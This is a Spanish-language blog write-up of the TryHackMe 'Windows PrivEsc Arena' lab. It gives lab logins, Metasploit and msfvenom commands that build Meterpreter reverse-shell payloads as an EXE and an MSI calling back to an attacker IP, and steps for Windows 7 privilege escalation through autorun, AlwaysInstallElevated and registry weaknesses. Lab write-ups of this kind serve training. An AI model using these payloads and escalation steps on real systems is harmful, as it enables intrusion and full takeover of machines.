---
layout: post
title: "Windows PrivEsc Arena"
subtitle: 'TryHackMe - Medium Machine - Windows'
date: 2020-08-17 12:00:00
author: "TheusZero"
header-img: "images/post/WindowsPEA/1.png"
catalog: true
comments: true
tags:
  - Windows
  - Machine
  - Explotations
  - Upgrade
  - Shell
  - Root
  - User
---

# Windows PrivEsc Arena - TryHackMe

Es una maquina o caja de TryHackMe enfocada en bypassear y escalar privilegios dento 
de maquinas windows, corresponde a windows 7 y trata sobre topicos como Autorun, DLL, Memory y Kernel.
Dentro de la maquina existen un total de **14 eventos o TASK** los cuales debemos completar para obtener el award de la maquina.

## Connecting to TryHackMe Network

facil, conectarse a la vpn de TryHackMe

## Deploy the vulnerable machine

aqui debemos spawnear la maquina, nos dan los usuarios para entrar a la maquina:

> username: user password: password321 || username: TCM password: Hacker123 

yo entre por rdesktop que simula una grafica del sistema windows, con es

## Registry Escalation - Autorun 

aqui intentaremos escalar privilegios encontrando un programa que se ejecute al inicio 

#### Detection

una vez dentro de la maquina windows, debemos acceder a una terminal de commandos y escrbir el prompt :
```Python
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
```
esto nos dara acceso a una ventana que nos mostrara diferentes procesos y elementos, sin embargo el que realmente nos interesa es el de nombre **logon**
![](/TheusZero/images/post/WindowsPEA/logon1.png)
al darle click podemos ver procesos que se ejecutan al principio o termino del windows, por lo tanto lo siguiente es buscar ese programa que encontramos ahi
![](/TheusZero/images/post/WindowsPEA/program-exe.png)
el **programa.exe** es un poco raro, ya que de por si debio ser creado por el usuario.
```Python
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```
con el output podemos ver que tenemos acceso total a los archivos, es decir, que podemos crear y escribrir archivos en la carpeta en la que esta el program.exe

hora de explotar.

#### explotation

abriremos un modulo de metasploit con **msfconsole** en la terminal, una vez dentro usaremos el modulo de multi/handler con 
```Python
use multi/handler
```
ahora le colocaremos el payload de reverse tcp shell 
```Python
set payload windows/meterpreter/reverse_tcp
```
colocaremos la ip nuestra 
```Python
set lhost [Kali VM IP Address]
```
y por ultimo le daremos a **run**

ahora ya con esto listo, generaremos el exploit creado con msfvenom dandole los siguientes comandos.

```Python
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe
```
> donde
>> **-p windows/meterpreter/reverse_tcp** corresponde al payload que se usara para crear el exploit
>
>> **-f exe** corresponde a la extension que tendra el archivo
>
>>  **-o program.exe** corresponde al output que tendra el programa

una vez hecho todo esto, solo queda pasar o descargar el archivo program.exe generado en la localizacion del verdadero program.exe en

> C:\Program Files\Autorun Program

te deslogueas y listo.

## AlwaysInstallElevated

#### Detection

abriendo la terminal de comandos cmd o powershell escribrimos:
![](/TheusZero/images/post/WindowsPEA/AIE.png)
```Python
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```
en el ouput obtenemos un archivo llamado **AlwaysInstallElevated** que corresponde a **1** es decir, esta activo, que hace esto?. 

Teniendo este mensajes tenemos un supuesto archivo que deja instalar archivos con permisos de administrador siempre, por lo tanto es importantisimo para escalar privilegios, pero como obtenemos acceso al superUsuario?

#### explotacion

creamos el exploit con msfconsole
```Python
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost [Kali VM IP Address]
```

ahora como ultimo paso en la creacion del exploit es usar el siguiente comando:

```Python
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
```

este comando crea un archivo de tipo Windows installer (MSI) con el payload que anteriormente creamos.

mandamos el archivo a la maquina windows, lo ubicamos en donde podamos.

ahora, para hacer funcional el exploit debemos mandar el siguiente comando via cmd o poweshell

```Python
msiexec /quiet /qn /i C:\Temp\setup.msi
```
siendo **C:\Temp\setup.msi** la ruta especifica y de raiz del archivo que creamos como tal.

## Registry

**requisitos**:

abrir una **powershell** 

#### Detection

el comando :

```Python
Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\services\regsvc | fl
```
nos mostrara que existe un servicio o registro como tal que tiene y ejecuta archivos de forma **NT AUTHORITY\INTERACTIVE** sobre la key del registro, por ende, si podemos configurarla a nuestro favor podremos obtener una shell de administrador


#### Exploitation

dentro de la maquina

[reverse shell script .c for privesec](https://github.com/sagishahar/scripts.git)